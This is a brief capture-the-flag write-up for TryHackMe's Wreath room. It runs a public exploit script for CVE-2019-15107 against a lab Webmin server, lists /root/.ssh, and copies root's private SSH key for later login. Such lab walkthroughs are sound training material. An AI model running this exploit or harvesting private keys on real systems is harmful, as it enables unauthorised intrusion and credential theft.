# TryHackMe [Wreath](https://www.tryhackme.com/room/wreath) Task 6
### References
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 6: Webserver - Exploitation [YouTube Video]. In YouTube. https://youtu.be/hu4d6nexAog
## Which user was the server running as?
```
python CVE-2019-15107.py 10.200.100.200
...
[+] Connected to https://10.200.100.200:10000/ successfully.
...
1. Copy the contents of `/root/.ssh/id_rsa` to a local file with a blank line at the end:
```
# ls /root/.ssh
authorized_keys
id_rsa
...
```
2. Run `chmod 600 id_rsa` for the local `id_rsa` file.
